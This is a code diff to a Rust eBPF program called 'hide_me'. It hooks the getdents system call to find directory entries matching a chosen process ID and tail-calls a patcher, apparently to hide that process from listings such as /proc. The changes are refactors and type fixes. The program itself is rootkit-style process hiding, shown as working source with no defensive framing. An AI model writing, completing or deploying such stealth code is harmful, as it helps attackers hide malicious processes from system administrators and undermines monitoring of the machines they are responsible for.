@@ -16,6 +16,8 @@ use aya_log_ebpf::info;
 
 use vmlinux::vmlinux::linux_dirent64;
 
+use hide_me_common::pid_to_hide_len;
+
 #[path = "./vmlinux/mod.rs"]
 mod vmlinux;
 
@@ -23,8 +25,6 @@ const PROG_HANDLER: u32 = 0;
 const PROG_PATCHER: u32 = 1;
 const MAX_FILE_LEN: usize = 10;
 
-#[no_mangle]
-static pid_to_hide_len: usize = 0;
 
 #[no_mangle]
 static pid_to_hide: [u8; MAX_FILE_LEN] = [0; MAX_FILE_LEN];
@@ -54,7 +54,9 @@ pub fn hide_me(ctx: TracePointContext) -> u32 {
 }
 
 fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
-    info!(&ctx, "target_ppid_len is {}", pid_to_hide_len);
+    unsafe {
+        info!(&ctx, "target_ppid_len is {}", pid_to_hide_len);
+    }
     let the_target_ppid = unsafe { target_ppid.get(&0) };
 
     if the_target_ppid.is_none() {
@@ -94,7 +96,7 @@ fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
     let pid = pid_tgid >> 32;
 
     // linux_dirent64 结构体 大小
-    let mut d_reclen: usize = 0;
+    let mut d_reclen: u16 = 0;
 
     let mut dirp: *const linux_dirent64 = core::ptr::null();
 
@@ -132,23 +134,23 @@ fn handle_getdents_exit(ctx: TracePointContext) -> Result<u32, u32> {
             );
         }
 
-        let mut j: usize = 0;
-        while j < pid_to_hide_len {
-            if filename[j] != pid_to_hide[j] {
-                break;
+        unsafe {
+            let mut j: usize = 0;
+            while j < pid_to_hide_len as usize {
+                if filename[j] != pid_to_hide[j] {
+                    break;
+                }
+                j += 1;
             }
-            j += 1;
-        }
 
-        if j == pid_to_hide_len {
-            map_bytes_read.remove(&pid_tgid).unwrap();
-            map_buffs.remove(&pid_tgid).unwrap();
-            unsafe {
+            if j == pid_to_hide_len as usize {
+                map_bytes_read.remove(&pid_tgid).unwrap();
+                map_buffs.remove(&pid_tgid).unwrap();
                 JUMP_TABLE.tail_call(&ctx, PROG_PATCHER).unwrap();
             }
         }
         map_to_patch.insert(&pid_tgid, &(dirp as usize), 0).unwrap();
-        bpos += d_reclen;
+        bpos += d_reclen as usize;
     }
 
     if bpos < total_bytes_read as usize {
